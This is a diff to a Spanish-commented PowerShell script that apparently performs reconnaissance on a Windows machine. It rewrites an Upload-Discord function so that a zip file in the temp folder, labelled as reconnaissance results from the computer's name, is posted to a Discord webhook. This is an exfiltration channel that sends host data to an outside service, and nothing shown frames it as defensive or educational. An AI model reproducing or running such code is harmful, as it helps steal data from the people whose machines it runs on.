@@ -483,14 +483,15 @@ try {
 }
 
 # Subir archivo a Discord
+
 function Upload-Discord {
     [CmdletBinding()]
     param (
-        [Parameter(Mandatory=$true)]
+        [Parameter(Mandatory = $true)]
         [string]$File,
-        [Parameter(Mandatory=$true)]
+        [Parameter(Mandatory = $true)]
         [string]$WebhookUrl,
-        [Parameter(Mandatory=$false)]
+        [Parameter(Mandatory = $false)]
         [string]$Message = "Archivo subido desde PowerShell"
     )
     try {
@@ -498,12 +499,20 @@ function Upload-Discord {
             Write-Error "El archivo $File no existe."
             return
         }
-        $curlCommand = "curl.exe -F `"file1=@$File`" -F `"content=$Message`" $WebhookUrl"
-        Invoke-Expression $curlCommand -ErrorAction Stop
-    } catch {
+
+        $form = @{
+            "content" = $Message
+            "file1"   = Get-Item $File
+        }
+
+        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Form $form -ErrorAction Stop
+        Write-Host "✅ Archivo enviado con éxito" -ForegroundColor Green
+    }
+    catch {
         Write-Error "Error al enviar el archivo a Discord: $_"
     }
 }
+
 
 try {
     Upload-Discord -File "$env:tmp\$ZIP" -WebhookUrl $dc -Message "Reconocimiento completado desde $env:COMPUTERNAME" -ErrorAction Stop
